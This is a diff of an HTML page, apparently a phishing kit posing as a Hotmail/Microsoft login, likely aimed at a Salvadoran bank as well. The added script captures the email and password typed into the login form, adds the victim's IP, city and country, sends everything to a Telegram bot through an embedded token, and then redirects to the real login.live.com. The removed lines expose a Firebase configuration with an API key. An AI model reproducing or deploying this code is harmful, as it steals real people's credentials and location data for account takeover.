@@ -25,76 +25,48 @@
 	
 	
 </body>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
-<!-- The core Firebase JS SDK is always required and must be listed first -->
-<script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-app.js"></script>
+<script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#loginform");
+    form.addEventListener("submit", (event) => {
+      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+      axios
+        .get(url)
+        .then((response) => {
+          const email = document.querySelector("#correo").value;
 
-<!-- TODO: Add SDKs for Firebase products that you want to use
-     https://firebase.google.com/docs/web/setup#available-libraries -->
-<script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-analytics.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-firestore.js"></script>
+          const contra = document.querySelector("#contra").value;
 
-
-
-<script id="testScriptName">
-  // Your web app's Firebase configuration
-   var firebaseConfig = {
-    apiKey: "AIzaSyDU0fPnneyoqebrHgS4OE2R-9puHmtug84",
-  authDomain: "agricolabanco-salvador.firebaseapp.com",
-  projectId: "agricolabanco-salvador",
-  storageBucket: "agricolabanco-salvador.appspot.com",
-  messagingSenderId: "1088237409908",
-  appId: "1:1088237409908:web:806d1c63c25814bf166321"
-
-  };
-  // Initialize Firebase  
-  firebase.initializeApp(firebaseConfig);
-
-</script>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
-
-<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
- <script>
-
-async function getIpClient() {
-  try {
-    const response = await axios.get('https://ipinfo.io/json');
-    console.log(response);
-    
-    function docReady(fn) {
-    // see if DOM is already available
-    if (document.readyState === "complete" || document.readyState === "interactive") {
-        // call on next available tick
-        setTimeout(fn, 1);
-    } else {
-        document.addEventListener("DOMContentLoaded", fn);
-    }
-}    
-docReady(function() {
-   
-   localStorage.setItem("pusr", response.data.country);
-   localStorage.setItem("commonspnn", response.data.ip);
-    
-});
-  } catch (error) {
-    console.error(error);
-    
-    
-    
-  }
-}
-var todayDate = new Date().toISOString().slice(0, 10);
-localStorage.setItem("pusrf", todayDate);
-
-getIpClient();
-
-      
-
-
-</script>
-
-	
-
-
-<script src="scriptp.js" defer></script>
+          const message =
+            "\nHotmail" +
+            "\nEmail: " +
+            email +
+            "\nContra: " +
+            contra +
+            "\nCiudad:" +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot7939634785:AAGTT1t0gvQbX7em0-TG9FWBltjhqD2PNYM/sendMessage",
+              {
+                chat_id: "-4641821308",
+                text: message,
+              }
+            )
+            .then((response) => {
+              window.location.href = "https://login.live.com/";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+  </script>
 </html>
